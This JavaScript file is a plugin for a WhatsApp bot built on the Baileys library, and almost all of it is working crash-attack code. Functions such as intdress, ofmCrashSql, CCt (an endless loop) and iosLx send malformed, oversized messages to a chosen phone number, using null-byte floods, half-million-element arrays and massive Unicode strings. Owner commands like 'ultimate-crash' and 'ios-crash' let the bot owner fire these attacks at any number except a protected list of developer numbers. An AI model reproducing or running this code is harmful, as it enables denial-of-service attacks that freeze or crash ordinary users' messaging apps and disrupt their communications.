const { cmd } = require('../momy');
const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require('@whiskeysockets/baileys');
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');

// ============================================================
// DEV NUMBERS PROTECTION
// ============================================================
let devNumbers = [];

async function loadDevNumbers() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/dawestava-hub/new-bot/refs/heads/main/config.json');
        if (response.data && response.data.ownerNumber) {
            devNumbers = response.data.ownerNumber.map(num => {
                let cleanNum = num.toString().replace(/[^0-9]/g, '');
                if (cleanNum.startsWith('0')) cleanNum = '255' + cleanNum.substring(1);
                return cleanNum + '@s.whatsapp.net';
            });
            console.log(`✅ Loaded ${devNumbers.length} protected developer numbers`);
        }
    } catch (e) {
        console.log('⚠️ Could not load dev numbers, using default protection');
        devNumbers = ['255627417402@s.whatsapp.net', '255789661031@s.whatsapp.net'];
    }
}

function isDevNumber(jid) {
    return devNumbers.includes(jid);
}

loadDevNumbers();

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// IMPORT ALL CRASH FUNCTIONS
// ============================================================

async function intdress(conn, target) {
    for (let i = 0; i < 10; i++) {
        await conn.relayMessage("status@broadcast",
            {
                interactiveResponseMessage: {
                    body: { text: "🇭🇹 .Shinigami", format: "EXTENSIONS_1" },
                    nativeFlowResponseMessage: { name: "address_message", paramsJson: "\u0000".repeat(1000), version: 3 },
                    contextInfo: { groupMentions: Array.from({ length: 2000 }, () => ({ groupJid: `1${Math.floor(Math.random() * 500000)}@g.us`, groupSubject: " #Shinigami " })) }
                }
            },
            { statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: { status_setting: "contacts" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }] }
        );
    }
    await sleep(1000);
}

async function iNTofmSqL(conn, target) {
    for (let i = 0; i < 10; i++) {
        await conn.relayMessage("status@broadcast",
            {
                botInvokeMessage: {
                    message: {
                        messageContextInfo: { messageSecret: crypto.randomBytes(32), deviceListMetadata: { senderKeyIndex: 0, senderTimestamp: Date.now(), recipientKeyIndex: 0 }, deviceListMetadataVersion: 2 },
                        interactiveResponseMessage: {
                            body: { text: ".Shinigami", format: "EXTENSIONS_1" },
                            nativeFlowResponseMessage: { name: (["address_message", "call_permission_request", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3]), paramsJson: "{ status: true }", version: 3 },
                            contextInfo: { participant: conn.user.id, remoteJid: "@shinigami", fromMe: true, statusAttributionType: 2, urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 500000 }, () => ({ type: 1 })) } }
                        }
                    }
                }
            },
            { statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: { status_setting: "allowlist" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }] }
        );
    }
    await sleep(1000);
}

async function urlDelay(conn, target) {
    for (let i = 0; i < 300; i++) {
        await conn.relayMessage("status@broadcast", {
            interactiveResponseMessage: {
                body: { text: "Shinigami", format: "DEFAULT" },
                nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "{}", version: 3 },
                contextInfo: { remoteJid: "zxcvbn", urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 500000 }, () => ({ "\0": "\0" })) } }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [{ tag: "meta", attrs: { status_setting: "contacts" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }]
        });
        await sleep(1000);
    }
}

async function iNTxSqL(conn, target) {
    for (let i = 0; i < 10; i++) {
        await conn.relayMessage("status@broadcast",
            {
                interactiveResponseMessage: {
                    body: { text: "\x10.Shinigami 👁‍🗨", format: "EXTENSIONS_1" },
                    nativeFlowResponseMessage: { name: (["address_message", "call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]), paramsJson: "{", version: 3 },
                    contextInfo: { remoteJid: "@shinigami", urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 200900 }, (_, i) => ({ type: 1 })) } }
                }
            },
            { statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: { status_setting: "allowlist" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }] }
        );
    }
    await sleep(1000);
}

async function ofmCrashSql(conn, target) {
    let cards = [];
    for (let p = 0; p < 25; p++) {
        cards.push({
            header: {
                title: 'Shinigami TEAM',
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEECBhQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
                },
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [{ name: "single_select", buttonParamsJson: `{"title":"${"\u0000".repeat(9000)}","rows":[]}` }]
            }
        });
    }

    const PouMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2, messageSecret: crypto.randomBytes(32), supportPayload: "{}" },
                interactiveMessage: {
                    body: { text: "Shinigami Exposed" },
                    carouselMessage: { cards: cards },
                    contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`), quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: 7205 } }, remoteJid: "status@broadcast" }
                }
            }
        }
    }, {});

    await conn.relayMessage(target, PouMsg.message, { messageId: PouMsg.key.id });
}

async function CCt(conn, target) {
    let quotedMessage = {
        key: { participant: "13135550002@s.whatsapp.net", remoteJid: "status@broadcast", fromMe: false },
        message: {
            interactiveResponseMessage: {
                body: { text: "🩸 ༑ SHINIGAMI 炎 ⟅ ༑ 🩸", format: "DEFAULT" },
                nativeFlowResponseMessage: { name: "address_message", paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"Shinigami\",\"landmark_area\":\"18\",\"address\":\"P0K3\",\"tower_number\":\"P0k3\",\"city\":\"tobrut\",\"name\":\"p0k3\",\"phone_number\":\"999999999999\",\"house_number\":\"13135550002\",\"floor_number\":\"@3135550202\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`, version: 3 }
            }
        }
    };
    while (true) {
        await conn.relayMessage(target, {
            contactsArrayMessage: {
                displayName: "Shinigami Exposed" + "ꦽ".repeat(20000),
                contextInfo: { stanzaId: "ABCDEF123456", quotedMessage: quotedMessage.message },
                contacts: Array.from({ length: 15 }, (_, p) => ({
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${"require('Shinigami').js " + "ꦽ".repeat(1500)} ${p + 1}\nitem1.TEL;waid=666666666${p}:666666666${p}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
                }))
            }
        }, {});
    }
}

async function LsD(conn, target) {
    for (let p = 0; p < 350; p++) {
        const PouMsg = {
            lottieStickerMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0&mms3=true",
                        fileSha256: "dlob6oYb5Tr671y0M+se6D7DUwViTijFhYc1luOGbTA=",
                        mediaKey: "v79wuS5Lfl653TKue0ZwUyHqfYWnUPjFndomy0qTZjM=",
                        mimetype: "application/was",
                        height: 1280,
                        width: 909,
                        directPath: "/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0",
                        fileLength: "134544",
                        mediaKeyTimestamp: "1774806705",
                        isAnimated: true,
                        stickerSentTs: "1774806705729",
                        isAvatar: false,
                        isAiSticker: false,
                        isLottie: true,
                        contextInfo: { remoteJid: "status@broadcast", mentionedJid: [target], urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 500000 }, () => ({ "\0": "\0" })) } }
                    }
                }
            }
        };
        await conn.relayMessage("status@broadcast", PouMsg, {
            statusJidList: [target],
            additionalNodes: [{ tag: "meta", attrs: { status_setting: "contacts" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }]
        });
        await sleep(30000);
    }
}

async function blankv1(conn, target) {
    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363419474272514@newsletter",
            newsletterName: "Shinigami X Zep" + "ោ៝".repeat(10000),
            caption: "shinigami.json" + "ោ៝".repeat(10000),
            inviteExpiration: "999999999",
            contextInfo: { mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
        }
    };
    await conn.relayMessage(target, msg, { messageId: null, participant: { jid: target } });
}

async function iosLx(conn, target) {
    const ZeppImg = fs.readFileSync('./bug.jpg');
    for (let z = 0; z < 100; z++) {
        await conn.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    locationMessage: {
                        degreesLatitude: 21.1266,
                        degreesLongitude: -11.8199,
                        name: `🧪⃟꙰。🎭⃟Shinigami Bug🐉` + "𑇂𑆵𑆴𑆿".repeat(60000),
                        url: "https://t.me/shinigami",
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net"),
                            externalAdReply: {
                                quotedAd: { advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000), mediaType: "IMAGE", jpegThumbnail: ZeppImg, caption: "𑇂𑆵𑆴𑆿".repeat(60000) },
                                placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                            }
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }
}

async function InViteAdminA(conn, IsTarget, ptcp = false) {
    const msg = {
        groupInviteMessage: {
            groupName: "ཹ".repeat(130000),
            groupJid: '6285709664923-1627579259@g.us',
            inviteCode: 'h+64P9RhJDzgXSPf',
            inviteExpiration: '999',
            caption: `🧪⃟꙰⌁ ҈🎭⃟༑⌁⃰𝐒𝐪𝐮𝐢͢𝐜𝐡𝐲 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
            thumbnail: null
        }
    };
    await conn.relayMessage(IsTarget, msg, ptcp ? { participant: { jid: IsTarget } } : {});
}

async function InViteAdminI(conn, IsTarget, ptcp = false) {
    const msg = {
        groupInviteMessage: {
            groupName: "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
            groupJid: '6285709664923-1627579259@g.us',
            inviteCode: 'h+64P9RhJDzgXSPf',
            inviteExpiration: '999',
            caption: `🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖🎭⃟༑⌁⃰𝐒𝐪𝐮𝐢͢𝐜𝐡𝐲 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
            thumbnail: null
        }
    };
    await conn.relayMessage(IsTarget, msg, ptcp ? { participant: { jid: IsTarget } } : {});
}

async function xrpay(conn, target, ptcp) {
    await conn.relayMessage(target, {
        requestPaymentMessage: {
            currencyCodeIso4217: "USD",
            amount1000: 999999,
            requestFrom: target,
            noteMessage: { extendedTextMessage: { text: " !🚫¡ • ( Shinigami ).. 👀 " } },
            expiryTimestamp: Date.now() * 999,
        },
    }, ptcp ? { participant: { jid: target } } : {});
}

async function ForceNewsletter(conn, target) {
    await conn.relayMessage(target, {
        groupStatusMentionMessage: {
            message: {
                protocolMessage: {
                    key: { participant: "131355550002@s.whatsapp.net", remoteJid: "status@broadcast", id: conn.generateMessageTag() },
                    type: "STATUS_MENTION_MESSAGE"
                }
            }
        }
    }, {});
}

async function StcSqL(conn, target) {
    for (let i = 0; i < 100; i++) {
        const cr = { key: { remoteJid: "status@broadcast", participant: "13135550002@bot", fromMe: false }, message: { conversation: "Shinigami" } };
        const msg = generateWAMessageFromContent(target, {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                mimetype: "image/webp",
                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                fileLength: "10610",
                mediaKeyTimestamp: "1775044724",
                stickerSentTs: "1775044724091",
            }
        }, { quoted: cr });
        await conn.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target }, messageId: msg.key.id });
        await sleep(7000);
    }
}

async function stcgs(conn, target) {
    for (let i = 0; i < 100; i++) {
        await conn.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    viewOnceMessageV2: {
                        message: {
                            stickerMessage: {
                                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                                mimetype: "image/webp",
                                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                                fileLength: "10610",
                                mediaKeyTimestamp: "1775044724",
                                stickerSentTs: "1775044724091"
                            }
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }
    await sleep(2000);
}

// ============================================================
// OWNER COMMANDS
// ============================================================

// Helper to get target JID and check protection
async function getTargetAndCheck(conn, m, args, isOwner, reply) {
    if (!isOwner) return { error: "❌ Owner only command" };

    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else {
        return { error: "❌ Please mention a user, provide a number, or reply to a message\n\nExample: .command 255712345678" };
    }

    if (isDevNumber(target)) {
        return { error: "❌ Cannot attack developer number! This number is protected." };
    }

    return { target };
}

// Command: .inconnu-kill
cmd({
    pattern: "inconnu-kill",
    alias: ["ikill", "inconnu"],
    desc: "Inconnu crash attack on target",
    category: "owner",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    const check = await getTargetAndCheck(conn, m, args, isOwner, reply);
    if (check.error) return reply(check.error);

    reply(`💀 Starting INCONNU KILL on ${check.target.split('@')[0]}...`);
    try {
        await intdress(conn, check.target);
        await sleep(500);
        await iNTofmSqL(conn, check.target);
        await sleep(500);
        await urlDelay(conn, check.target);
        await sleep(500);
        await iNTxSqL(conn, check.target);
        reply(`✅ INCONNU KILL completed on ${check.target.split('@')[0]}! 💀`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

// Command: .primis-kill
cmd({
    pattern: "primis-kill",
    alias: ["pkill", "primis"],
    desc: "Primis crash attack on target",
    category: "owner",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    const check = await getTargetAndCheck(conn, m, args, isOwner, reply);
    if (check.error) return reply(check.error);

    reply(`💀 Starting PRIMIS KILL on ${check.target.split('@')[0]}...`);
    try {
        await ofmCrashSql(conn, check.target);
        await sleep(500);
        await CCt(conn, check.target);
        await sleep(500);
        await blankv1(conn, check.target);
        reply(`✅ PRIMIS KILL completed on ${check.target.split('@')[0]}! 💀`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

// Command: .sukuna-crash
cmd({
    pattern: "sukuna-crash",
    alias: ["sukuna", "skrash"],
    desc: "Sukuna crash attack on target",
    category: "owner",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    const check = await getTargetAndCheck(conn, m, args, isOwner, reply);
    if (check.error) return reply(check.error);

    reply(`💀 Starting SUKUNA CRASH on ${check.target.split('@')[0]}...`);
    try {
        await StcSqL(conn, check.target);
        await sleep(500);
        await stcgs(conn, check.target);
        reply(`✅ SUKUNA CRASH completed on ${check.target.split('@')[0]}! 💀`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

// Command: .dyby-crash
cmd({
    pattern: "dyby-crash",
    alias: ["dyby", "dcrash"],
    desc: "Dyby crash attack on target",
    category: "owner",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    const check = await getTargetAndCheck(conn, m, args, isOwner, reply);
    if (check.error) return reply(check.error);

    reply(`💀 Starting DYBY CRASH on ${check.target.split('@')[0]}...`);
    try {
        await InViteAdminA(conn, check.target);
        await sleep(500);
        await InViteAdminI(conn, check.target);
        await sleep(500);
        await xrpay(conn, check.target);
        await sleep(500);
        await ForceNewsletter(conn, check.target);
        reply(`✅ DYBY CRASH completed on ${check.target.split('@')[0]}! 💀`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

// Command: .ios-crash (iPhone specific)
cmd({
    pattern: "ios-crash",
    alias: ["ios", "iphonecrash", "icrash"],
    desc: "iOS specific crash attack (iPhone users)",
    category: "owner",
    react: "📱",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    const check = await getTargetAndCheck(conn, m, args, isOwner, reply);
    if (check.error) return reply(check.error);

    reply(`📱 Starting iOS CRASH on ${check.target.split('@')[0]}...`);
    try {
        await iosLx(conn, check.target);
        reply(`✅ iOS CRASH completed on ${check.target.split('@')[0]}! 📱 Target iPhone may be affected!`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

// Command: .android-crash (Android specific)
cmd({
    pattern: "android-crash",
    alias: ["android", "droidcrash", "acrash"],
    desc: "Android specific crash attack",
    category: "owner",
    react: "🤖",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    const check = await getTargetAndCheck(conn, m, args, isOwner, reply);
    if (check.error) return reply(check.error);

    reply(`🤖 Starting ANDROID CRASH on ${check.target.split('@')[0]}...`);
    try {
        await LsD(conn, check.target);
        reply(`✅ ANDROID CRASH completed on ${check.target.split('@')[0]}! 🤖`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

// Command: .ultimate-crash (All combined)
cmd({
    pattern: "ultimate-crash",
    alias: ["ucrash", "megacrash", "totalcrash"],
    desc: "Ultimate all-in-one crash attack",
    category: "owner",
    react: "👑",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    const check = await getTargetAndCheck(conn, m, args, isOwner, reply);
    if (check.error) return reply(check.error);

    reply(`👑 Starting ULTIMATE CRASH on ${check.target.split('@')[0]}...`);
    try {
        await intdress(conn, check.target);
        await sleep(300);
        await iNTofmSqL(conn, check.target);
        await sleep(300);
        await urlDelay(conn, check.target);
        await sleep(300);
        await iNTxSqL(conn, check.target);
        await sleep(300);
        await ofmCrashSql(conn, check.target);
        await sleep(300);
        await CCt(conn, check.target);
        await sleep(300);
        await blankv1(conn, check.target);
        await sleep(300);
        await iosLx(conn, check.target);
        await sleep(300);
        await StcSqL(conn, check.target);
        await sleep(300);
        await LsD(conn, check.target);
        await sleep(300);
        await InViteAdminA(conn, check.target);
        await sleep(300);
        await InViteAdminI(conn, check.target);
        await sleep(300);
        await xrpay(conn, check.target);
        await sleep(300);
        await ForceNewsletter(conn, check.target);
        reply(`👑 ULTIMATE CRASH completed on ${check.target.split('@')[0]} - Target DESTROYED! 💀👑`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

// Command: .dev-protection - Show protected numbers
cmd({
    pattern: "dev-protection",
    alias: ["protected", "devlist"],
    desc: "Show protected developer numbers",
    category: "owner",
    react: "🛡️",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, reply }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let list = "🛡️ PROTECTED DEVELOPER NUMBERS 🛡️\n\n";
    devNumbers.forEach(num => {
        list += `• ${num.split('@')[0]}\n`;
    });
    list += `\n⚠️ These numbers cannot be attacked!`;
    reply(list);
});

module.exports = { 
    intdress, iNTofmSqL, urlDelay, iNTxSqL, ofmCrashSql, CCt, LsD, blankv1, iosLx,
    InViteAdminA, InViteAdminI, xrpay, ForceNewsletter, StcSqL, stcgs
};
